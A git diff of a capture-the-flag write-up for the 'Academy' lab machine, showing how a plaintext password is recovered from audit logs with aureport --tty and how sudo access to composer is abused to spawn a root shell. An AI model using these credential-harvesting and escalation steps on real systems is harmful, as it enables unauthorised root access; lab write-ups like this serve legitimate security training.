@@ -234,4 +234,88 @@ After we run linPEAS, we can notice that cry0l1t3 user is part of adm group and 
 OS: Linux version 5.4.0-52-generic (buildd@lgw01-amd64-060) (gcc version 9.3.0 (Ubuntu 9.3.0-17ubuntu1~20.04)) #57-Ubuntu SMP Thu Oct 15 10:57:00 UTC 2020
 User & Groups: uid=1002(cry0l1t3) gid=1002(cry0l1t3) groups=1002(cry0l1t3),4(adm)
 ```
-As we have seen in [Doctor.htb](Doctor.md) 
+As we have seen in [Doctor.htb](Doctor.md) having a user inside this group can be dangerous because most likey, also in a real world scenario, logs will contain password, hece let's dig int /var/log.  
+After poking around for a while we can notice an audit directory.  
+Now we can use ```aureport``` in order to grab info and statistics from the audit logs.  
+```
+cry0l1t3@academy:/var/log/audit$ aureport                  
+
+Summary Report                                             
+======================                                     
+Error opening config file (Permission denied)              
+NOTE - using built-in logs: /var/log/audit/audit.log       
+Range of time in logs: 01/01/70 00:00:00.000 - 05/17/22 20:12:01.235                                                  
+Selected time for report: 01/01/70 00:00:00 - 05/17/22 20:12:01.235                                                   
+Number of changes in configuration: 61                     
+Number of changes to accounts, groups, or roles: 7         
+Number of logins: 21                                       
+Number of failed logins: 33                                
+Number of authentications: 77                              
+Number of failed authentications: 10                       
+Number of users: 5                                         
+Number of terminals: 10                                    
+Number of host names: 7                                    
+Number of executables: 11                                  
+Number of commands: 6                                      
+Number of files: 0                                         
+Number of AVC's: 0                                         
+Number of MAC events: 0                                    
+Number of failed syscalls: 0                               
+Number of anomaly events: 0                                
+Number of responses to anomaly events: 0                   
+Number of crypto events: 0                                 
+Number of integrity events: 0                              
+Number of virt events: 0                                   
+Number of keys: 0                                          
+Number of process IDs: 18731                               
+Number of events: 117709 
+```
+enumerating flags of ```aureport``` we can use the ```--tty``` flag:  
+```
+cry0l1t3@academy:/var/log/audit$ aureport --tty            
+
+TTY Report                                                 
+===============================================            
+# date time event auid term sess comm data                 
+===============================================            
+Error opening config file (Permission denied)              
+NOTE - using built-in logs: /var/log/audit/audit.log       
+1. 08/12/20 02:28:10 83 0 ? 1 sh "su mrb3n",<nl>           
+2. 08/12/20 02:28:13 84 0 ? 1 su "mrb3n_Ac@d3my!",<nl>     
+3. 08/12/20 02:28:24 89 0 ? 1 sh "whoami",<nl>             
+4. 08/12/20 02:28:28 90 0 ? 1 sh "exit",<nl>               
+5. 08/12/20 02:28:37 93 0 ? 1 sh "/bin/bash -i",<nl>       
+6. 08/12/20 02:30:43 94 0 ? 1 nano <delete>,<delete>,<delete>,<delete>,<delete>,<down>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<down>,<delete>,<delete>,<delete>,<delete>,<delete>,<down>,<delete>,<delete>,<delete>,<delete>,<delete>,<down>,<delete>,<delete>,<delete>,<delete>,<delete>,<^X>,"y",<ret>
+7. 08/12/20 02:32:13 95 0 ? 1 nano <down>,<up>,<up>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<down>,<backspace>,<down>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<^X>,"y",<ret>                                                                               
+8. 08/12/20 02:32:55 96 0 ? 1 nano "6",<^X>,"y",<ret>      
+9. 08/12/20 02:33:26 97 0 ? 1 bash "ca",<up>,<up>,<up>,<backspace>,<backspace>,"cat au",<tab>,"| grep data=",<ret>,"cat au",<tab>,"| cut -f11 -d\" \"",<ret>,<up>,<left>,<left>,<left>,<left>,<left>,<left>,<left>,<left>,<left>,<left>,<left>,<left>,<left>,<left>,<left>,<left>,<right>,<right>,"grep data= | ",<ret>,<up>," > /tmp/data.txt",<ret>,"id",<ret>,"cd /tmp",<ret>,"ls",<ret>,"nano d",<tab>,<ret>,"cat d",<tab>," | xx",<tab>,"-r -p",<ret>,"ma",<backspace>,<backspace>,<backspace>,"nano d",<tab>,<ret>,"cat dat",<tab>," | xxd -r p",<ret>,<up>,<left>,"-",<ret>,"cat /var/log/au",<tab>,"t",<tab>,<backspace>,<backspace>,<backspace>,<backspace>,<backspace>,<backspace>,"d",<tab>,"aud",<tab>,"| grep data=",<ret>,<up>,<up>,<up>,<up>,<up>,<down>,<ret>,<up>,<up>,<up>,<ret>,<up>,<up>,<up>,<ret>,"exit",<backspace>,<backspace>,<backspace>,<backspace>,"history",<ret>,"exit",<ret>
+10. 08/12/20 02:33:26 98 0 ? 1 sh "exit",<nl>              
+11. 08/12/20 02:33:30 107 0 ? 1 sh "/bin/bash -i",<nl>     
+12. 08/12/20 02:33:36 108 0 ? 1 bash "istory",<ret>,"history",<ret>,"exit",<ret>                                      
+13. 08/12/20 02:33:36 109 0 ? 1 sh "exit",<nl>             
+cry0l1t3@academy:/var/log/audit$                                   
+
+```
+And here we can find a password ```mrb3n:mrb3n_Ac@d3my!``` for another user.  
+Once we swich to that user, intuitively, we can run a ```sudo -l```, provide the password and we will see the following:  
+```
+mrb3n@academy:~$ sudo -l                                             
+[sudo] password for mrb3n:                                 
+Matching Defaults entries for mrb3n on academy:            
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin 
+
+User mrb3n may run the following commands on academy:      
+    (ALL) /usr/bin/composer  
+```
+Now, all we have to do is search for [GTFOBins for composer](https://gtfobins.github.io/gtfobins/composer/) and run the privilege escalation commands:  
+```
+mrb3n@academy:~$ TF=$(mktemp -d)                           
+mrb3n@academy:~$ echo '{"scripts":{"x":"/bin/sh -i 0<&3 1>&3 2>&3"}}' >$TF/composer.json                              
+mrb3n@academy:~$ sudo composer --working-dir=$TF run-script x                                                         
+PHP Warning:  PHP Startup: Unable to load dynamic library 'mysqli.so' (tried: /usr/lib/php/20190902/mysqli.so (/usr/lib/php/20190902/mysqli.so: undefined symbol: mysqlnd_global_stats), /usr/lib/php/20190902/mysqli.so.so (/usr/lib/php/20190902/mysqli.so.so: cannot open shared object file: No such file or directory)) in Unknown on line 0                  
+PHP Warning:  PHP Startup: Unable to load dynamic library 'pdo_mysql.so' (tried: /usr/lib/php/20190902/pdo_mysql.so (/usr/lib/php/20190902/pdo_mysql.so: undefined symbol: mysqlnd_allocator), /usr/lib/php/20190902/pdo_mysql.so.so (/usr/lib/php/20190902/pdo_mysql.so.so: cannot open shared object file: No such file or directory)) in Unknown on line 0      
+Do not run Composer as root/super user! See https://getcomposer.org/root for details                                  
+> /bin/sh -i 0<&3 1>&3 2>&3                                
+# id
+uid=0(root) gid=0(root) groups=0(root)
+```
